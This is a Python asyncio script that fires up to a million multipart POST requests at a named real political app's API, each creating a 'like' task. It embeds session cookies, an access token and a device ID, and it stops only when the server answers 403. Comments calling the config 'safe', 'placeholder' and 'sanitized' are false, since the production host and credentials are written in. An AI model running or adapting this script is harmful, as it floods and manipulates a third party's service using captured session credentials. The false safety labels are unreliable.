import asyncio
import aiohttp

# =========================================================
# CONFIG (SAFE / PLACEHOLDER)
# =========================================================

URL = "https://api.narendramodi.in/mlapiv1"   # ⛔ replace ONLY in authorized lab
BOUNDARY = "Boundary+TEST123456"

CONCURRENCY = 10
MAX_RETRIES = 1
TOTAL_REQUESTS = 1000000

stop_flag = False

# =========================================================
# HEADERS (SANITIZED)
# =========================================================

HEADERS = {
    "Host": "api.narendramodi.in",
    "Accept": "*/*",
    "Requestfrom": "ios",
    "Upload-Draft-Interop-Version": "6",
    "Upload-Complete": "?1",
    "Accept-Language": "en-IN;q=1, hi-IN;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "User-Agent": "NM-App-Test/7.8 (iOS)",
    "Connection": "keep-alive",
    "Cookie": "_abck=E921128DDAE2823E0112175943B9E330~-1~YAAQVXIsMQc+Yy+bAQAAFxy6Ww/i19Ds7YyqtOIwBcj5595BzM0R+HxgvM4run+06vvJCtClFZ7W7SCPIc1pHBStyLkJtx47hPDUDRQSjByZDUhNn/xP7NIIt4OxmwoSiy/dlKNSo8wBD3RlsRXAKl43jYxPt6bBbI2CqaAJUNBiLqS9dvsXTCDHJ8FknqMuLLwpne/2V1X257i3lU6rH/dBGznIVSDiZNmkrX1DlLDKrrzIj1tijCTpvn7pxz9c0+DqENudQpad3VptUQsZ6fUMkF2xTAQUzVzgRVD9c3b9bDnf/yhoVq8hl/HW0w6z9Wegmwcc5T4TSCr04NPYxOwhTTWafK8/bwOLKRVnKiyQNK57OGvUhLiS04Xnd3MoAWapYuRmjD6PGC9OjkR96UKkv9njJq5yT2EiLgZozcGXR3B2DhuJcMne8Hxn2de/9kIHVep2X3jUJaUDm6N24ObghAjOeEhI4LLVc1/NAbuHG42QwZ7gfJdBwCYHVI00ZplPseCZO+W1WyojyF3mrH27S3bAGQ+tZW700cGSaX7vWPcU4h6V50Yj6dr4vMP038c32Ts=~-1~-1~1765907225~AASAAAAE%2f%2f%2f%2f%2f6Wk3kihiD2nXO2VCmgoSdNntX0%2f2v0dITY7B6MB7iU+IHFTYqCHVkPt70t12YXm1KganDO1~-1; NSC_10.10.24.75_443=ffffffff0902062045525d5f4f58455e445a4a423660; ak_bmsc=1C6C94DD3FCD25802B9783B04299224F~000000000000000000000000000000~YAAQVXIsMd5eYi+bAQAAeZWoWx58tolGhvYH1aBJo/P87TUjunrlovd1BLx1IFF7kLCUvrYd85p4tahyRKuF5UpUI5TDfRciRgcU+lkyiZgYr0HNcrGp47uc9nPq3R6uG6ueHsUFQZU89kzIPM1EPnCEMmwZGjxHzLJcdzlAJrJ04uo5cCINszLXO6R1ma9BENLfFwkt1uPg4iycJntf7FcdXxpgkPd2KYbHtO/T/zQKDncxEwPnA8E1JjcczyYvdqrl9x14z2BpuqtsNjOTkrFNgldLCrzO/2UB/hPsTjs9+sjHo/VQDXNTcpoL5Zd/KVWBLQMzIF+YecfmlXtGVQRupnSfBBxVzGYH22TM6Vqe3A==; bm_sz=1E23F40B186E194D5C8B12966C57C766~YAAQVXIsMcz6Xy+bAQAAoZSSWx7i5LJqGgNTb3od9v/5TfJd+gj+enbr8DA29kH2JfRVa41f9Y1g4L1mZurp6b4lT6gI9frcCrrw37jYQKU8xOnTFHpSKwvKkjRogeK5fIDnyCSl/t6/w/vBM67izQWStzkhIHTNh8lJO/B7xeG+trHqwWq1/avOhRnl+mEyQf09z1izSheOU77vlNgwvlTH3nzOolMvYG/Q3xz0T+ahu5DnExuL83FiLamyDObew07QYaROG+jp9QdbRWFOYHSk11DFeTNU0XLmm6C9Ovqx+3QafuSenxEmqRcnkgJ6UeAaICS/NTmbCbci0DJmwXibBjeCWAj5fEj71a+NMKqxG+SIFCugzlOebnACE1sCKx32IFvgKadkeA2my9qQATYkcezLcURTfRyJdX1P/c8iQrCn~4539205~3356721; _ga_F433FYMYX9=GS2.1.s1765908971$o4$g1$t1765908973$j58$l0$h0; _ga_GXKBS9831X=GS2.1.s1765908971$o2$g0$t1765908973$j58$l0$h0; _fbp=fb.1.1758623618568.22689390473729608; WZRK_G=0b186018b046466a9c8fabc3a6abc97e; _ga=GA1.1.169979920.1756910999; _ga_KY7X120D0N=GS2.1.s1765908967$o3$g0$t1765908967$j60$l0$h0; _ga_6XHS1RXTBF=GS2.1.s1765903577$o2$g0$t1765903577$j60$l0$h0; _ga_KE0FR5JBNB=GS2.1.s1765903414$o2$g0$t1765903414$j60$l0$h0; _ga_VFNMV2T18E=GS2.1.s1765902441$o2$g1$t1765902491$j10$l0$h0; _ga_977P7XNV6X=GS2.2.s1758550394$o3$g0$t1758550394$j60$l0$h0; _ga_HQGP5S5CDY=GS2.1.s1756910998$o1$g0$t1756910999$j59$l0$h0"
}

# =========================================================
# MULTIPART BODY
# =========================================================

def build_body(index: int) -> str:
    return (
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="description"\r\n\r\n\r\n'

        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="enddate"\r\n\r\n\r\n'

        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="startdate"\r\n\r\n\r\n'

        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="liketype"\r\n\r\n'
        "likemedia\r\n"

        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="linkurl"\r\n\r\n\r\n'

        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="navigationtag"\r\n\r\n\r\n'

        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="addressid"\r\n\r\n'
        "13b7363bd59097275c257fdb851a448e28b7415ded656033d44a5fb4c786178f\r\n"

        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="title"\r\n\r\n'
        f"Har Ghar Swadeshi, Ghar-Ghar Swadeshi 11#{index}\r\n"

        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="action"\r\n\r\n'
        "createliketask\r\n"

        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="X-Access-Token"\r\n\r\n'
        "090d9c7a834ca0123bf4cef01b11e1d156c20d88677a12cb815154f6a92141fd026dfe7a8a8e84ee855d159a74b25d4edf9e6e95896f6231f60ebf2bba8a6368f3e557548df9f400a8e5d94e2880c345e0598d851afe1e320abd69145b7b0849162bc409b07f885577ae9b846d8b68fd092dc9817ed6de897864e0579b87ec2e9e46a839ebd569ac4dc74dc03bc4857aead80c49836256b07196df4bce17e821327be7b786b23c125f7f75cd02e4f7988f49461a565036d46ef84e3c6d08791e817f1276189d39c2ec751c9b706232014417f3d418e4c4e95524bcc8a2deaa74ba521c85d4060da88b5fc362a210db24\r\n"

        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="tasktype"\r\n\r\n'
        "like\r\n"

        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="deviceid"\r\n\r\n'
        "8455FFF3-8E05-4F50-8087-D71D37FB4F2C\r\n"

        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="apiversion"\r\n\r\n'
        "2\r\n"

        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="groupid"\r\n\r\n\r\n'

        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="x-app-version"\r\n\r\n'
        "7.8\r\n"

        f"--{BOUNDARY}--\r\n"
    )

# =========================================================
# REQUEST SENDER
# =========================================================

async def send_request(session, index: int):
    global stop_flag

    if stop_flag:
        return

    body = build_body(index)

    headers = HEADERS.copy()
    headers["Content-Type"] = f"multipart/form-data; boundary={BOUNDARY}"

    for attempt in range(1, MAX_RETRIES + 1):
        if stop_flag:
            return

        try:
            async with session.post(
                URL,
                headers=headers,
                data=body,
                timeout=5
            ) as response:

                print(f"[{index}] Status {response.status}")

                if response.status == 403:
                    stop_flag = True
                    print("❌ 403 detected — stopping all tasks")
                    return

                if response.status == 200:
                    return

        except Exception as e:
            print(f"[{index}] Error (attempt {attempt}): {e}")
            await asyncio.sleep(1)

# =========================================================
# MAIN EXECUTOR (THROTTLE ADDED ✅)
# =========================================================

async def main():
    semaphore = asyncio.Semaphore(CONCURRENCY)

    async with aiohttp.ClientSession() as session:

        async def runner(i):
            async with semaphore:
                await send_request(session, i)

        tasks = []

        for i in range(1, TOTAL_REQUESTS + 1):
            if stop_flag:
                break

            tasks.append(asyncio.create_task(runner(i)))

            # ✅ SAME THROTTLE AS ORIGINAL SCRIPT
            if i % 50 == 0:
                await asyncio.sleep(5)

        await asyncio.gather(*tasks, return_exceptions=True)

# =========================================================
# ENTRY POINT
# =========================================================

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nStopped by user")
